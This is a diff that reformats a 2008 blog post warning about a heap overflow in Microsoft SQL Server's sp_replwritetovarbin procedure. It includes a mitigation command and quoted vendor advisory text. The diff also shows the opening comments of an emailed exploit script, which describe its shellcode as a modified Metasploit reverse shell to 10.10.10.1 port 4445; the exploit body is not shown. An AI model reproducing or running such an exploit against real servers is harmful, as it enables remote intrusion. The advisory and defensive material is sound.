@@ -3,6 +3,7 @@ title: sp_replwritetovarbin Heap Overflow Code Exploit Code In The Wild, Works B
 author: SQLDenis
 type: post
 date: 2008-12-23T11:50:40+00:00
+ID: 259
 url: /index.php/datamgmt/datadesign/sp_replwritetovarbin-heap-overflow-code/
 views:
   - 18011
@@ -24,7 +25,9 @@ In a default configuration, the sp_replwritetovarbin stored procedure is accessi
   
 Before disabling this pro read BradC&#8217;s comment so that you do not break replication
 
-<pre>execute master.dbo.sp_dropextendedproc 'sp_replwritetovarbin'</pre>
+sql
+execute master.dbo.sp_dropextendedproc 'sp_replwritetovarbin'
+```
 
 Microsoft is investigating new public reports of a vulnerability that could allow remote code execution on systems with supported editions of Microsoft SQL Server 2000, Microsoft SQL Server 2005, Microsoft SQL Server 2005 Express Edition, Microsoft SQL Server 2000 Desktop Engine (MSDE 2000), Microsoft SQL Server 2000 Desktop Engine (WMSDE), and Windows Internal Database (WYukon). Systems with Microsoft SQL Server 7.0 Service Pack 4, Microsoft SQL Server 2005 Service Pack 3, and Microsoft SQL Server 2008 are not affected by this issue.
 
@@ -38,7 +41,8 @@ http://msdn.microsoft.com/en-us/library/aa215995(SQL.80).aspx
 
 Here is the code someone emailed me to test for the exploit 
 
-<pre>// k`sOSe 12/17/2008
+```vb
+// k`sOSe 12/17/2008
 <%// Microsoft SQL Server "sp_replwritetovarbin()" Heap Overflow
 // Tested on Win2k SP4 with MSSQL 2000(on one box only!).
 // Shellcode is a slightly modified metasploit reverse shell(on 10.10.10.1 port 4445),
@@ -311,4 +315,5 @@ Else
 end if
 
 
-%></pre>
+%>
+```
